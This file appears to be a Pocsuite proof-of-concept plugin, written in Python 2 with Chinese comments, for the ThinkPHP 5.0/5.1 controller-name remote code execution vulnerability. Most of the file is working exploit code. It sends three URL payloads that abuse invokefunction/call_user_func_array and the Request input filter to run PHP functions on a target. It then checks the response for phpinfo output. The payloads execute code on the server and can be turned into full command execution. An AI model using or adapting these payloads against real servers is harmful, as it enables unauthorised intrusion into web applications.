#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @userVersion : python 2.7
# @Author  : lyb
# @Data    : 2018/12/14
# @Effect  : thinkphp5__5_0_5_1_execute
# @Version : V0.0

import urllib
import random
import string
from collections import OrderedDict

from pocsuite.api.request import req as requests #用法和 requests 完全相同
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase


class TestPOC(POCBase):
    PocName = 'thinkphp5__5_0_5_1_execute '
    vulID = '1'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1'  #默认为1
    author = 'lyb'  #  PoC作者的大名
    vulDate = '2018/12/14'  #漏洞公开的时间,不知道就写今天
    createDate = '2018/12/14'  # 编写 PoC 的日期
    updateDate = '2018/12/14'  # PoC 更新的时间,默认和编写时间一样
    references = [
        'https://www.seebug.org/vuldb/ssvid-97715']  # 漏洞地址来源,0day不用写
    name = 'Thinkphp5控制器名过滤不严导致getshell PoC'  # PoC 名称
    appPowerLink = 'https://blog.thinkphp.cn/869075'  # 漏洞厂商主页地址
    appName = 'thinkphp5'  # 漏洞应用名称
    appVersion = '5.0 5.1'  # 漏洞影响版本
    vulType = 'Command Execution'  #漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        由于框架对控制器名没有进行足够的检测会导致在没有开启强制路由的情况下可能的getshell漏洞，受影响的版本包括5.0和5.1版本
    '''  # 漏洞简要描述
    samples = []  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写

    def _attack(self):
        '''attack mode'''
        return self._verify()

    def _verify(self):
        '''verify mode'''
        result = {}
        self.url=self.url.strip()
        payloads = [
            '/?s=index/\\think\\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1',
            '/?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1',
            '/?s=index/\\think\\Request/input&filter=phpinfo&data=1']
        for payload in payloads:
            newurl = self.url.strip() + payload
            try:
                r = requests.get(newurl,timeout=5)
                if "PHP Version" in r.text:
                    result['VerifyInfo'] = {}
                    result['VerifyInfo']['URL'] = newurl
                    break
            except Exception as e:
                return self.parse_output(result)
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)
